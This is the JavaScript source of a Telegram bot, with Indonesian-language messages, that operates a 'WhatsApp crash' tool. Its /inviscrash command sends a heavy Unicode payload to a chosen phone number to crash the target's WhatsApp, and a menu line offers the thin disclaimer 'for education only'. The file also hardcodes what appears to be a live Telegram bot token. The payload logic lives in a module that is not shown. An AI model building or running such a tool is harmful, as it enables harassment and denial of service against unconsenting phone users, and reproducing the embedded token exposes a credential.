const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const wa = require('./whatsapp');

const token = '7365727161:AAE6Kx7s1GZttTyXA0bgzrlLM883TQ37tnY';
const bot = new TelegramBot(token, { polling: true });

let pairings = {};
const pairFile = './pairings.json';

if (fs.existsSync(pairFile)) {
  pairings = JSON.parse(fs.readFileSync(pairFile));
}

bot.onText(/\/pairing (\d+)/, async (msg, match) => {
  const nomor = match[1];
  const chatId = msg.chat.id;

  pairings[nomor] = chatId;
  fs.writeFileSync(pairFile, JSON.stringify(pairings, null, 2));

  const result = await wa.startPairing(nomor);
  bot.sendMessage(chatId, `🟢 Pairing nomor ${nomor}...\n${result}`);
});

bot.onText(/\/inviscrash (\d+)/, async (msg, match) => {
  const nomor = match[1];
  const chatId = pairings[nomor];

  if (!chatId) return bot.sendMessage(msg.chat.id, `❌ Nomor ${nomor} belum dipair.`);

  try {
    await wa.invisPayload(nomor);
    bot.sendMessage(msg.chat.id, `✅ Payload invis dikirim ke ${nomor}`);
  } catch (err) {
    bot.sendMessage(msg.chat.id, `⚠️ Gagal kirim payload: ${err.message}`);
  }
});

bot.onText(/\/menu/, (msg) => {
  const menuText = `
📱 *MENU BOT WHATSAPP CRASH*
━━━━━━━━━━━━━━━━━━━━━━
🔗 /pairing <nomor>
• Pair nomor WhatsApp ke bot (scan QR)

💥 /inviscrash <nomor>
• Kirim pesan berat Unicode (crash bug)

🆘 Contoh:
/pairing 6281234567890
/inviscrash 6281234567890
━━━━━━━━━━━━━━━━━━━━━━
⚠️ Gunakan hanya untuk edukasi atau pembuktian
  `;
  bot.sendMessage(msg.chat.id, menuText, { parse_mode: "Markdown" });
});
